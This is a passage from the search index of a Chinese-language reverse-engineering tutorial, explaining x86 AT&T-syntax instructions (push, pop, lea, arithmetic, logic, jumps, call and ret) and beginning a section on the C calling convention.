\u4f1a\u968f\u7740\u4e0d\u65ad\u5165\u6808\u4ece\u800c\u6301\u7eed\u9012\u51cf, \u5373\u6808\u5185\u5b58\u662f\u4ece\u9ad8\u5730\u5740\u5355\u5143\u5230\u4f4e\u5730\u5740\u5355\u5143\u589e\u957f. \u8bed\u6cd5 push <reg32 push <mem push <con32 \u4f8b\u5b50 push %eax ;\u5c06 EAX \u9001\u5165\u6808 push var(,1) ;\u5c06 var \u5bf9\u5e94\u7684 4 \u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u9001\u5165\u6808\u4e2d pop \u51fa\u6808 pop \u6307\u4ee4\u4ece\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u9876\u7aef\u79fb\u9664 4 \u5b57\u8282\u7684\u6570\u636e, \u5e76\u628a\u8fd9\u4e2a\u6570\u636e\u653e\u5230\u8be5\u6307\u4ee4\u6307\u5b9a\u7684\u53c2\u6570\u4e2d ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5176\u9996\u5148\u5c06\u5185\u5b58\u4e2d ( %esp ) \u7684 4 \u5b57\u8282\u6570\u636e\u653e\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143\u4e2d, \u7136\u540e\u8ba9 ESP + 4. \u8bed\u6cd5 pop <reg32 pop <mem \u4f8b\u5b50 pop %edi ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u5230\u5bc4\u5b58\u5668 EDI \u4e2d. pop (%ebx) ;\u5c06\u6808\u9876\u7684\u5143\u7d20\u79fb\u9664, \u5e76\u653e\u5165\u4ece EBX \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\u5355\u5143\u4e2d. \u91cd\u70b9\u5185\u5bb9 : \u6808 \u6808\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5b58\u50a8\u7a7a\u95f4, \u7279\u6b8a\u5728\u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u4e0a, \u5b83\u7684\u8bbf\u95ee\u5f62\u5f0f\u5c31\u662f\u6700\u540e\u8fdb\u5165\u8fd9\u4e2a\u7a7a\u95f4\u7684\u6570\u636e, \u6700\u5148\u51fa\u53bb, \u4e5f\u5c31\u662f \"\u5148\u8fdb\u540e\u51fa, \u540e\u8fdb\u5148\u51fa\". lea \u52a0\u8f7d\u6709\u6548\u5730\u5740 lea \u6307\u4ee4\u5c06\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5355\u5143 \u653e\u5165\u5230 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d. \u6ce8\u610f, \u8be5\u6307\u4ee4\u4e0d\u52a0\u8f7d\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u53ea\u662f\u8ba1\u7b97\u6709\u6548\u5730\u5740\u5e76\u5c06\u5176\u653e\u5165\u5bc4\u5b58\u5668. \u8fd9\u5bf9\u4e8e\u83b7\u5f97\u6307\u5411\u5b58\u50a8\u5668\u533a\u57df\u7684\u6307\u9488\u6216\u8005\u6267\u884c\u7b80\u5355\u7684\u7b97\u672f\u8fd0\u7b97\u975e\u5e38\u6709\u7528. \u4e5f\u8bb8\u8fd9\u91cc\u4f60\u4f1a\u770b\u5f97\u4e00\u5934\u96fe\u6c34, \u4e0d\u8fc7\u4f60\u4e0d\u5fc5\u62c5\u5fc3, \u8fd9\u91cc\u6709\u66f4\u4e3a\u901a\u4fd7\u6613\u61c2\u7684\u89e3\u91ca. \u6c47\u7f16\u8bed\u8a00\u4e2d lea \u6307\u4ee4\u548c mov \u6307\u4ee4\u7684\u533a\u522b ? MOV \u6307\u4ee4\u7684\u529f\u80fd\u662f\u4f20\u9001\u6570\u636e\uff0c\u4f8b\u5982 MOV AX,[1000H] \uff0c\u4f5c\u7528\u662f\u5c06 1000H \u4f5c\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u5bfb\u5740\u627e\u5230\u5185\u5b58\u5355\u5143\uff0c\u5c06\u8be5\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u9001\u81f3 AX\uff1b LEA \u6307\u4ee4\u7684\u529f\u80fd\u662f\u53d6\u504f\u79fb\u5730\u5740\uff0c\u4f8b\u5982 LEA AX,[1000H] \uff0c\u4f5c\u7528\u662f\u5c06\u6e90\u64cd\u4f5c\u6570 [1000H] \u7684\u504f\u79fb\u5730\u5740 1000H \u9001\u81f3 AX\u3002\u7406\u89e3\u65f6\uff0c\u53ef\u76f4\u63a5\u5c06[ ]\u53bb\u6389\uff0c\u7b49\u540c\u4e8e MOV AX,1000H \u3002 \u518d\u5982\uff1a LEA BX,[AX] \uff0c\u7b49\u540c\u4e8e MOV BX,AX \uff1b LEA BX,TABLE \u7b49\u540c\u4e8e MOV BX,OFFSET TABLE \u3002 \u4f46\u6709\u65f6\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 MOV \u4ee3\u66ff\uff1a \u6bd4\u5982\uff1a LEA AX,[SI+6] \u4e0d\u80fd\u76f4\u63a5\u66ff\u6362\u6210\uff1a MOV AX,SI+6 \uff1b\u4f46\u53ef\u66ff\u6362\u4e3a\uff1a MOV AX,SI ADD AX,6 \u4e24\u6b65\u5b8c\u6210\u3002 \u53c2\u8003\u94fe\u63a5 \u8bed\u6cd5 lea <mem, <reg32 \u4f8b\u5b50 lea (%ebx,%esi,8), %edi ;EBX+8*ESI \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EDI lea val(,1), %eax ;val \u7684\u503c\u88ab\u79fb\u5165\u5230\u4e86 EAX","title":"3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#3342","text":"add \u6574\u6570\u76f8\u52a0 add \u6307\u4ee4\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u52a0, \u7136\u540e\u5c06\u7ed3\u679c\u5b58\u653e\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u6ce8\u610f, \u53c2\u6570\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668,\u4f46\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u5355\u5143. \u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6211\u4eec\u76f4\u63a5\u770b\u8bed\u6cd5 : \u8bed\u6cd5 add <reg, <reg add <mem, <reg add <reg, <mem add <con, <reg add <con, <mem \u4f8b\u5b50 add $10, %eax ;EAX \u4e2d\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3a\u4e86 EAX+10. addb $10, (%eax) ;\u5f80 EAX \u4e2d\u7684\u503c \u6240\u4ee3\u8868\u7684\u5185\u5b58\u5355\u5143\u5730\u5740 \u52a0\u4e0a 1 \u4e2a\u5b57\u8282\u7684\u6570\u5b57 10. sub \u6574\u6570\u76f8\u51cf sub \u6307\u4ee4\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e0e\u7b2c\u4e00\u4e2a\u76f8\u51cf, \u5c31\u662f\u540e\u9762\u90a3\u4e2a\u51cf\u53bb\u524d\u9762\u90a3\u4e2a, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u50a8\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570. \u548c add \u4e00\u6837, \u4e24\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668, \u4f46\u4e24\u4e2a\u53c2\u6570\u4e2d\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f\u5185\u5b58\u5355\u5143. \u8bed\u6cd5 sub <reg, <reg sub <mem, <reg sub <con, <reg sub <con, <mem \u4f8b\u5b50 sub %ah, %al ;AL \u88ab\u8bbe\u7f6e\u6210 AL-AH sub $216, %eax ;\u5c06 EAX \u4e2d\u7684\u503c\u51cf\u53bb 216 inc, dec \u81ea\u589e, \u81ea\u51cf inc \u6307\u4ee4\u8ba9\u5b83\u7684\u53c2\u6570\u52a0 1, dec \u6307\u4ee4\u5219\u662f\u8ba9\u5b83\u7684\u53c2\u6570\u51cf\u53bb 1. \u8bed\u6cd5 inc <reg inc <mem dec <reg dec <mem \u4f8b\u5b50 dec %eax ;EAX \u4e2d\u7684\u503c\u51cf\u53bb 1 incl var(,1) ;\u5c06 var \u6240\u4ee3\u8868\u7684 32 \u4f4d\u6574\u6570\u52a0\u4e0a 1. imul \u6574\u6570\u76f8\u4e58 imul \u6307\u4ee4\u6709\u4e24\u79cd\u57fa\u672c\u683c\u5f0f : \u7b2c\u4e00\u79cd\u662f 2 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u5f00\u59cb\u4e24\u6761 ); \u7b2c\u4e8c\u79cd\u683c\u5f0f\u662f 3 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u6700\u540e\u4e24\u6761 ). 2 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u8fd0\u7b97\u7ed3\u679c ( \u5373\u7b2c\u4e8c\u4e2a\u53c2\u6570 ) \u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668. 3 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u5b83\u7684\u7b2c 1 \u4e2a\u53c2\u6570\u548c\u7b2c 2 \u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c 3 \u4e2a\u53c2\u6570\u4e2d, \u5f53\u7136, \u7b2c 3 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668. \u6b64\u5916, \u7b2c 1 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5e38\u6570. \u8bed\u6cd5 imul <reg32, <reg32 imul <mem, <reg32 imul <con, <reg32, <reg32 imul <con, <mem, <reg32 \u4f8b\u5b50 imul (%ebx), %eax ;\u5c06 EAX \u4e2d\u7684 32 \u4f4d\u6574\u6570, \u4e0e EBX \u4e2d\u7684\u5185\u5bb9\u6240\u6307\u7684\u5185\u5b58\u5355\u5143, \u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230 EAX \u4e2d. imul $25, %edi, %esi ;ESI \u88ab\u8bbe\u7f6e\u4e3a EDI * 25. idiv \u6574\u6570\u76f8\u9664 idiv \u53ea\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\uff0c\u6b64\u64cd\u4f5c\u6570\u4e3a\u9664\u6570\uff0c\u800c\u88ab\u9664\u6570\u5219\u4e3a EDX : EAX \u4e2d\u7684\u5185\u5bb9\uff08\u4e00\u4e2a64\u4f4d\u7684\u6574\u6570\uff09\uff0c \u9664\u6cd5\u7ed3\u679c ( \u5546 ) \u5b58\u5728 EAX \u4e2d, \u800c\u6240\u5f97\u7684\u4f59\u6570\u5b58\u5728 EDX \u4e2d. \u8bed\u6cd5 idiv <reg32 idiv <mem \u4f8b\u5b50 idiv %ebx ;\u7528 EDX : EAX \u7684\u503c\u9664\u4ee5 EBX \u7684\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d. idivw (%ebx) ;\u5c06 EDX : EAX \u7684\u503c\u9664\u4ee5\u5b58\u50a8\u5728 EBX \u6240\u5bf9\u5e94\u5185\u5b58\u5355\u5143\u7684 32 \u4f4d\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d. and, or, xor \u6309\u4f4d\u903b\u8f91 \u4e0e, \u6216, \u5f02\u6216 \u8fd0\u7b97 \u8fd9\u4e9b\u6307\u4ee4\u5206\u522b\u5bf9\u5b83\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u76f8\u5e94\u7684\u903b\u8f91\u8fd0\u7b97, \u8fd0\u7b97\u7ed3\u679c\u5b58\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d. \u8bed\u6cd5 and <reg, <reg and <mem, <reg and <reg, <mem and <con, <reg and <con, <mem or <reg, <reg or <mem, <reg or <reg, <mem or <con, <reg or <con, <mem xor <reg, <reg xor <mem, <reg xor <reg, <mem xor <con, <reg xor <con, <mem \u4f8b\u5b50 and $0x0F, %eax ;\u53ea\u7559\u4e0b EAX \u4e2d\u6700\u540e 4 \u4f4d\u6570\u5b57 (\u4e8c\u8fdb\u5236\u4f4d) xor %edx, %edx ;\u5c06 EDX \u7684\u503c\u5168\u90e8\u8bbe\u7f6e\u6210 0 not \u903b\u8f91\u4f4d\u8fd0\u7b97 \u975e \u5bf9\u53c2\u6570\u8fdb\u884c\u903b\u8f91\u975e\u8fd0\u7b97, \u5373\u7ffb\u8f6c\u53c2\u6570\u4e2d\u6240\u6709\u4f4d\u7684\u503c. \u8bed\u6cd5 not <reg not <mem \u4f8b\u5b50 not %eax ;\u5c06 EAX \u7684\u6240\u6709\u503c\u7ffb\u8f6c. neg \u53d6\u8d1f\u6307\u4ee4 \u53d6\u53c2\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\u8d1f\u6570. \u76f4\u63a5\u770b\u4f8b\u5b50\u4e5f\u8bb8\u4f1a\u66f4\u597d\u61c2. \u8bed\u6cd5 neg <reg neg <mem \u4f8b\u5b50 neg %eax ;EAX \u2192 -EAX shl, shr \u6309\u4f4d\u5de6\u79fb\u6216\u8005\u53f3\u79fb \u8fd9\u4e24\u4e2a\u6307\u4ee4\u5bf9\u7b2c\u4e00\u4e2a\u53c2\u6570\u8fdb\u884c\u4f4d\u8fd0\u7b97, \u79fb\u52a8\u7684\u4f4d\u6570\u7531\u7b2c\u4e8c\u4e2a\u53c2\u6570\u51b3\u5b9a, \u79fb\u52a8\u8fc7\u540e\u7684\u7a7a\u4f4d\u62ff 0 \u8865\u4e0a.\u88ab\u79fb\u7684\u53c2\u6570\u6700\u591a\u53ef\u4ee5\u88ab\u79fb 31 \u4f4d. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f 8 \u4f4d\u5e38\u6570\u6216\u8005\u5bc4\u5b58\u5668 CL. \u5728\u4efb\u610f\u60c5\u51b5\u4e0b, \u5927\u4e8e 31 \u7684\u79fb\u4f4d\u90fd\u9ed8\u8ba4\u662f\u4e0e 32 \u53d6\u6a21. \u8bed\u6cd5 shl <con8, <reg shl <con8, <mem shl %cl, <reg shl %cl, <mem shr <con8, <reg shr <con8, <mem shr %cl, <reg shr %cl, <mem \u4f8b\u5b50 shl $1, %eax ;\u5c06 EAX \u7684\u503c\u4e58\u4ee5 2 (\u5982\u679c\u6700\u9ad8\u6709\u6548\u4f4d\u662f 0 \u7684\u8bdd) shr %cl, %ebx ;\u5c06 EBX \u7684\u503c\u9664\u4ee5 2n, \u5176\u4e2d n \u4e3a CL \u4e2d\u7684\u503c, \u8fd0\u7b97\u6700\u7ec8\u7ed3\u679c\u5b58\u5230 EBX \u4e2d. \u4f60\u4e5f\u8bb8\u4f1a\u60f3, \u660e\u660e\u53ea\u662f\u628a\u6570\u5b57\u4e8c\u8fdb\u5236\u79fb\u4e86 1 \u4f4d, \u7ed3\u679c\u5374\u662f\u7b49\u4e8e\u8fd9\u4e2a\u6570\u5b57\u4e58\u4ee5 2.\u4ec0\u4e48\u60c5\u51b5 ? \u8fd9\u51e0\u4e2a\u4f4d\u8fd0\u7b97\u7684\u7ed3\u679c\u548c\u8ba1\u7b97\u673a\u8868\u793a\u6570\u5b57\u7684\u539f\u7406\u6709\u5173,\u8bf7\u770b\u672c\u7ae0\u9644\u5f55\u7684\u8ba1\u7b97\u673a\u6570\u5b57\u8868\u793a.","title":"3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#3343","text":"x86 \u5904\u7406\u5668\u6709\u4e00\u4e2a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 ( EIP ), \u8be5\u5bc4\u5b58\u5668\u4e3a 32 \u4f4d\u5bc4\u5b58\u5668, \u5b83\u7528\u6765\u5728\u5185\u5b58\u4e2d\u6307\u793a\u6211\u4eec\u8f93\u5165\u6c47\u7f16\u6307\u4ee4\u7684\u4f4d\u7f6e. \u5c31\u662f\u8bf4\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6307\u5411\u54ea\u4e2a\u5185\u5b58\u5355\u5143, \u90a3\u4e2a\u5355\u5143\u5b58\u50a8\u7684\u673a\u5668\u7801\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4. \u901a\u5e38\u5b83\u662f\u6307\u5411\u6211\u4eec\u7a0b\u5e8f\u8981\u6267\u884c\u7684 \u4e0b\u4e00\u6761\u6307\u4ee4. \u4f46\u662f\u4f60\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c EIP \u5bc4\u5b58\u5668, \u4f60\u9700\u8981\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4\u6765\u9690\u5f0f\u5730\u7ed9\u5b83\u8d4b\u503c. \u6211\u4eec\u4f7f\u7528\u7b26\u53f7 <label \u6765\u5f53\u4f5c\u7a0b\u5e8f\u4e2d\u7684\u6807\u7b7e. \u901a\u8fc7\u8f93\u5165\u6807\u7b7e\u540d\u79f0\u540e\u8ddf\u5192\u53f7, \u53ef\u4ee5\u5c06\u6807\u7b7e\u63d2\u5165 x86 \u6c47\u7f16\u4ee3\u7801\u6587\u672c\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e. \u4f8b\u5982 : mov 8(%ebp), %esi begin: xor %ecx, %ecx mov (%esi), %eax \u8be5\u4ee3\u7801\u7247\u6bb5\u4e2d\u7684\u7b2c\u4e8c\u6bb5\u88ab\u5957\u4e0a\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e. \u5728\u4ee3\u7801\u7684\u5176\u5b83\u5730\u65b9, \u6211\u4eec\u53ef\u4ee5\u7528 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u4ece\u800c\u66f4\u65b9\u4fbf\u5730\u6765\u5f15\u7528\u8fd9\u6bb5\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e. \u8fd9\u4e2a\u6807\u7b7e\u53ea\u662f\u7528\u6765\u66f4\u65b9\u4fbf\u5730\u8868\u793a\u4f4d\u7f6e\u7684, \u5b83\u5e76\u4e0d\u662f\u7528\u6765\u4ee3\u8868\u67d0\u4e2a 32 \u4f4d\u503c. jmp \u8df3\u8f6c\u6307\u4ee4 \u5c06\u7a0b\u5e8f\u8df3\u8f6c\u5230\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5730\u5740, \u7136\u540e\u6267\u884c\u8be5\u5185\u5b58\u5730\u5740\u7684\u6307\u4ee4. \u8bed\u6cd5 jmp <label \u4f8b\u5b50 jmp begin ;\u8df3\u8f6c\u5230\u6253\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u7684\u5730\u65b9 jcondition \u6709\u6761\u4ef6\u7684\u8df3\u8f6c \u8fd9\u4e9b\u6307\u4ee4\u662f\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4, \u5b83\u4eec\u57fa\u4e8e\u4e00\u7ec4\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001, \u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001\u5b58\u653e\u5728\u79f0\u4e3a\u673a\u5668\u72b6\u6001\u5b57 ( machine status word ) \u7684\u7279\u6b8a\u5bc4\u5b58\u5668\u4e2d. \u673a\u5668\u72b6\u6001\u5b57\u7684\u5185\u5bb9\u5305\u62ec\u5173\u4e8e\u6700\u540e\u6267\u884c\u7684\u7b97\u672f\u8fd0\u7b97\u7684\u4fe1\u606f. \u4f8b\u5982, \u8fd9\u4e2a\u5b57\u7684\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7684\u7ed3\u679c\u662f\u5426\u4e3a 0. \u53e6\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7ed3\u679c\u662f\u5426\u4e3a\u8d1f\u6570. \u57fa\u4e8e\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801, \u53ef\u4ee5\u6267\u884c\u8bb8\u591a\u6761\u4ef6\u8df3\u8f6c. \u4f8b\u5982, \u5982\u679c\u6700\u540e\u4e00\u6b21\u7b97\u672f\u8fd0\u7b97\u7ed3\u679c\u4e3a 0, \u5219 jz \u6307\u4ee4\u5c31\u662f\u8df3\u8f6c\u5230\u6307\u5b9a\u53c2\u6570\u6807\u7b7e. \u5426\u5219, \u7a0b\u5e8f\u5c31\u6309\u7167\u6d41\u7a0b\u8fdb\u5165\u4e0b\u4e00\u6761\u6307\u4ee4. \u8bb8\u591a\u6761\u4ef6\u5206\u652f\u7684\u540d\u79f0\u90fd\u662f\u5f88\u76f4\u89c2\u7684, \u8fd9\u4e9b\u6307\u4ee4\u7684\u8fd0\u884c, \u90fd\u548c\u4e00\u4e2a\u7279\u6b8a\u7684\u6bd4\u8f83\u6307\u4ee4\u6709\u5173, cmp ( \u89c1\u4e0b\u6587 ). \u4f8b\u5982, \u50cf jle \u548c jne \u8fd9\u79cd\u6307\u4ee4, \u5b83\u4eec\u9996\u5148\u5bf9\u53c2\u6570\u8fdb\u884c cmp \u64cd\u4f5c. \u8bed\u6cd5 je <label ;\u5f53\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c jne <label ;\u5f53\u4e0d\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c jz <label ;\u5f53\u6700\u540e\u7ed3\u679c\u4e3a 0 \u7684\u65f6\u5019\u8df3\u8f6c jg <label ;\u5f53\u5927\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jge <label ;\u5f53\u5927\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jl <label ;\u5f53\u5c0f\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jle <label ;\u5f53\u5c0f\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c \u4f8b\u5b50 cmp %ebx, %eax jle done ;\u5982\u679c EAX \u7684\u503c\u5c0f\u4e8e\u7b49\u4e8e EBX \u7684\u503c, \u5c31\u8df3\u8f6c\u5230 \" done \" \u6807\u7b7e, \u5426\u5219\u5c31\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4. cmp \u6bd4\u8f83\u6307\u4ee4 \u6bd4\u8f83\u4e24\u4e2a\u53c2\u6570\u7684\u503c, \u9002\u5f53\u5730\u8bbe\u7f6e\u673a\u5668\u72b6\u6001\u5b57\u4e2d\u7684\u6761\u4ef6\u4ee3\u7801. \u6b64\u6307\u4ee4\u4e0esub\u6307\u4ee4\u7c7b\u4f3c\uff0c\u4f46\u662fcmp\u4e0d\u7528\u5c06\u8ba1\u7b97\u7ed3\u679c\u4fdd\u5b58\u5728\u64cd\u4f5c\u6570\u4e2d. \u8bed\u6cd5 cmp <reg, <reg cmp <mem, <reg cmp <reg, <mem cmp <con, <reg \u4f8b\u5b50 cmpb $10, (%ebx) jeq loop ;\u5982\u679c EBX \u7684\u503c\u7b49\u4e8e\u6574\u6570\u5e38\u91cf 10, \u5219\u8df3\u8f6c\u5230\u6807\u7b7e \" loop \" \u7684\u4f4d\u7f6e. call, ret \u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de \u8fd9\u4e24\u4e2a\u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8c03\u7528\u548c\u8fd4\u56de. call \u6307\u4ee4\u9996\u5148\u5c06\u5f53\u524d\u4ee3\u7801\u4f4d\u7f6e\u63a8\u5230\u5185\u5b58\u4e2d\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u4e0a ( \u8bf7\u770b push \u6307\u4ee4 ), \u7136\u540e\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6807\u7b7e\u53c2\u6570\u6307\u5b9a\u7684\u4ee3\u7801\u4f4d\u7f6e. \u4e0e\u7b80\u5355\u7684 jmp \u6307\u4ee4\u4e0d\u540c, call \u6307\u4ee4\u4fdd\u5b58\u4e86\u5b50\u7a0b\u5e8f\u5b8c\u6210\u65f6\u8fd4\u56de\u7684\u4f4d\u7f6e. \u5c31\u662f call \u6307\u4ee4\u7ed3\u675f\u540e, \u8fd4\u56de\u5230\u8c03\u7528\u4e4b\u524d\u7684\u5730\u5740. ret \u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8fd4\u56de. \u8be5\u6307\u4ee4\u9996\u5148\u4ece\u6808\u4e2d\u53d6\u51fa\u4ee3\u7801 ( \u7c7b\u4f3c\u4e8e pop \u6307\u4ee4 ). \u7136\u540e\u5b83\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u68c0\u7d22\u5230\u7684\u4ee3\u7801\u4f4d\u7f6e. \u8bed\u6cd5 call <label ret","title":"3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#335-calling-convention","text":"\u4e3a\u4e86\u65b9\u4fbf\u4e0d\u540c\u7684\u7a0b\u5e8f\u5458\u53bb\u5206\u4eab\u4ee3\u7801\u548c\u8fd0\u884c\u5e93, \u5e76\u7b80\u5316\u4e00\u822c\u5b50\u7a0b\u5e8f\u7684\u4f7f\u7528, \u7a0b\u5e8f\u5458\u4eec\u901a\u5e38\u4f1a\u9075\u5b88\u4e00\u5b9a\u7684\u7ea6\u5b9a ( Calling Convention ). \u8c03\u7528\u7ea6\u5b9a\u662f\u5173\u4e8e\u5982\u4f55\u4ece\u4f8b\u7a0b\u8c03\u7528\u548c\u8fd4\u56de\u7684\u534f\u8bae. \u4f8b\u5982\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u7a0b\u5e8f\u5458\u4e0d\u9700\u8981\u68c0\u67e5\u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u6765\u786e\u5b9a\u5982\u4f55\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u5b50\u4f8b\u7a0b. \u6b64\u5916\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u53ef\u4ee5\u4f7f\u9ad8\u7ea7\u8bed\u8a00\u7f16\u8bd1\u5668\u9075\u5faa\u89c4\u5219\uff0c\u4ece\u800c\u5141\u8bb8\u624b\u52a8\u7f16\u7801\u7684\u6c47\u7f16\u8bed\u8a00\u4f8b\u7a0b\u548c\u9ad8\u7ea7\u8bed\u8a00\u4f8b\u7a0b\u76f8\u4e92\u8c03\u7528. \u6211\u4eec\u5c06\u8bb2\u89e3\u88ab\u5e7f\u6cdb\u4f7f\u7528\u7684 C \u8bed\u8a00\u8c03\u7528\u7ea6\u5b9a. \u9075\u5faa\u6b64\u7ea6\u5b9a\u5c06\u5141\u8bb8\u60a8\u7f16\u5199\u53ef\u4ece C ( \u548cC ++ ) \u4ee3\u7801\u5b89\u5168\u5730\u8c03\u7528\u7684\u6c47\u7f16\u8bed\u8a00\u5b50\u4f8b\u7a0b, \u5e76\u4e14\u8fd8\u5141\u8bb8\u60a8\u4ece\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\u8c03\u7528 C \u51fd\u6570\u5e93. C \u8c03\u7528\u7ea6\u5b9a\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53d6\u51b3\u4e8e\u4f7f\u7528\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58. \u5b83\u57fa\u4e8e push , pop , call \u548c ret \u6307\u4ee4. \u5b50\u7a0b\u5e8f\u7684\u53c2\u6570\u5728\u6808\u4e0a\u4f20\u9012. \u5bc4\u5b58\u5668\u4fdd\u5b58\u5728\u6808\u4e2d, \u5b50\u7a0b\u5e8f\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\u653e\u5728\u6808\u4e2d. \u5728\u5927\u591a\u6570\u5904\u7406\u5668\u4e0a\u5b9e\u73b0\u7684\u9ad8\u7ea7\u8fc7\u7a0b\u8bed\u8a00\u90fd\u4f7f\u7528\u4e86\u7c7b\u4f3c\u7684\u8c03\u7528\u7ea6\u5b9a. \u8c03\u7528\u7ea6\u5b9a\u5206\u4e3a\u4e24\u7ec4. \u7b2c\u4e00\u7ec4\u89c4\u5219\u662f\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u8c03\u7528\u8005 ( Caller ) \u7684, \u7b2c\u4e8c\u7ec4\u89c4\u5219\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u7f16\u5199\u8005, \u5373\u88ab\u8c03\u7528\u8005 ( Callee ). \u5e94\u8be5\u5f3a\u8c03\u7684\u662f, \u9519\u8bef\u5730\u9075\u5b88\u8fd9\u4e9b\u89c4\u5219\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7684\u81f4\u547d\u9519\u8bef, 